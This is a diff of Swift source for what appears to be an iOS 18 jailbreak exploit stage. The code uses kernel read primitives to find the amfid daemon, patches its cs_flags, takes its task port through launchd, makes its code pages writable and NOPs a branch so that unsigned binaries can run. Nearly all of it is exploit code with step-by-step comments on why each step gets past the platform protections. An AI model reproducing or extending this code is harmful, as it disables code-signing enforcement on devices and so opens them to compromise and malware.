@@ -7,7 +7,7 @@
 //
 //  This is the CLEAN, RELIABLE approach combining all learnings:
 //
-//  1. Find amfid PID via sysctl (userspace — no kernel proc walk needed!)
+//  1. Find amfid via procbyname() (C code — walks from our_proc, proven working)
 //  2. Patch amfid's cs_flags via C code (procbypid works from our_proc)
 //  3. task_for_pid from launchd (uid=0, has task_for_pid-allow)
 //  4. mach_vm_region → find amfid's __TEXT base (ASLR slide)
@@ -17,8 +17,8 @@
 //  8. Test spawn unsigned binary
 //
 //  WHY THIS WORKS:
-//  - sysctl KERN_PROC works from any process (no kernel walk needed)
-//  - procbypid() in C starts from our_proc (valid, no PAC issues)
+//  - procbyname() in C starts from our_proc (valid, no PAC issues)
+//  - sysctl is sandboxed on iOS 18 (doesn't show system daemons)
 //  - launchd has uid=0 + task_for_pid-allow entitlement
 //  - amfid's __TEXT is userspace memory (no PPL/KTRR protection)
 //  - mach_vm_protect can make userspace pages writable
@@ -65,40 +65,64 @@ final class ExpAmfidNopFinal {
         out("══════════════════════════════════════════")
         out("")
         out("Target: cbz w22,0x100002f74 → NOP")
-        out("Method: sysctl → procbypid → task_for_pid → vm_write")
+        out("Method: procbyname → cs_flags → task_for_pid → vm_write")
         out("")
         
-        // ─── Step 1: Find amfid PID via sysctl ───
-        out("[1/7] Finding amfid via sysctl...")
-        let amfidPid = findAmfidPidViaSysctl()
+        // ─── Step 1: Find amfid via kernel proc list (C code) ───
+        out("[1/7] Finding amfid via procbyname (kernel)...")
         
-        if amfidPid <= 0 {
-            out("❌ amfid not found via sysctl")
-            out("   Trying to trigger amfid spawn...")
+        // Use C procbyname — walks from our_proc (proven working)
+        // sysctl is sandboxed on iOS 18 and doesn't show system daemons
+        var amfidProc = procbyname("amfid")
+        var finalPid: Int32 = 0
+        
+        if amfidProc == 0 {
+            out("⚠️ procbyname failed — trying trigger + retry...")
             triggerAmfidSpawn()
-            let retry = findAmfidPidViaSysctl()
-            if retry <= 0 {
-                out("❌ amfid still not found — may be kernel-embedded (TXM)")
-                return output
-            }
-            out("✅ amfid found after trigger: PID \(retry)")
-        } else {
-            out("✅ amfid PID = \(amfidPid)")
+            amfidProc = procbyname("amfid")
         }
         
-        let finalPid = amfidPid > 0 ? amfidPid : findAmfidPidViaSysctl()
-        guard finalPid > 0 else { return output }
+        if amfidProc == 0 {
+            // Last resort: try known PID from panic log
+            out("⚠️ procbyname still failed — trying procbypid(54)...")
+            amfidProc = procbypid(54)
+            if amfidProc != 0 {
+                // Verify it's actually amfid by reading name
+                var nameBytes = [UInt8](repeating: 0, count: 32)
+                for i in 0..<4 {
+                    let chunk = ds_kread64(amfidProc + UInt64(off_proc_p_name) + UInt64(i * 8))
+                    withUnsafeBytes(of: chunk) { buf in
+                        for j in 0..<8 where i*8+j < 32 { nameBytes[i*8+j] = buf[j] }
+                    }
+                }
+                let name = String(bytes: nameBytes.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
+                if !name.contains("amfid") {
+                    out("❌ PID 54 is '\(name)', not amfid")
+                    amfidProc = 0
+                } else {
+                    out("✅ PID 54 confirmed as amfid")
+                    finalPid = 54
+                }
+            }
+        }
+        
+        if amfidProc == 0 {
+            out("❌ amfid not found in kernel proc list")
+            out("   Possible causes:")
+            out("   - amfid not running (on-demand on iOS 18)")
+            out("   - proc list corrupted")
+            out("   - amfid embedded in kernel (TXM)")
+            return output
+        }
+        
+        if finalPid == 0 {
+            finalPid = Int32(ds_kread32(amfidProc + UInt64(off_proc_p_pid)))
+        }
+        out("✅ amfid found: PID \(finalPid) @ 0x\(String(format: "%llx", amfidProc))")
         out("")
         
         // ─── Step 2: Patch amfid cs_flags via kernel ───
         out("[2/7] Patching amfid cs_flags (allow task_for_pid)...")
-        let amfidProc = procbypid(finalPid)
-        if amfidProc == 0 {
-            out("❌ procbypid(\(finalPid)) returned 0")
-            out("   C proc walker failed — proc list may be corrupted")
-            return output
-        }
-        out("amfid kernel proc: 0x\(String(format: "%llx", amfidProc))")
         
         // Patch cs_flags to allow debugging + task_for_pid
         let patched = amfi_bypass_patch_csflags(amfidProc)
@@ -354,26 +378,19 @@ final class ExpAmfidNopFinal {
     }
     #endif
     
-    // MARK: - Find amfid PID via sysctl (NO kernel walk needed!)
+    // MARK: - Find amfid PID via sysctl (fallback — may be sandboxed on iOS 18)
     
     private func findAmfidPidViaSysctl() -> Int32 {
-        // Use sysctl KERN_PROC_ALL to list all processes
-        // This is a userspace API — no kernel memory access needed
+        // Note: On iOS 18, sysctl KERN_PROC_ALL is sandboxed for app processes
+        // and may not show system daemons. Use procbyname() from C instead.
         var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0]
         var size: Int = 0
-        
-        // First call: get buffer size
-        guard sysctl(&mib, 4, nil, &size, nil, 0) == 0 else { return -1 }
-        
-        // Allocate buffer
+        guard sysctl(&mib, 4, nil, &size, nil, 0) == 0, size > 0 else { return -1 }
         let count = size / MemoryLayout<kinfo_proc>.stride
+        guard count > 0 else { return -1 }
         var procs = [kinfo_proc](repeating: kinfo_proc(), count: count)
-        
-        // Second call: get data
         guard sysctl(&mib, 4, &procs, &size, nil, 0) == 0 else { return -1 }
-        
         let actualCount = size / MemoryLayout<kinfo_proc>.stride
-        
         for i in 0..<actualCount {
             let proc = procs[i]
             let name = withUnsafePointer(to: proc.kp_proc.p_comm) { ptr -> String in
@@ -381,11 +398,8 @@ final class ExpAmfidNopFinal {
                     String(cString: cStr)
                 }
             }
-            if name == "amfid" {
-                return proc.kp_proc.p_pid
-            }
+            if name == "amfid" { return proc.kp_proc.p_pid }
         }
-        
         return -1
     }
     
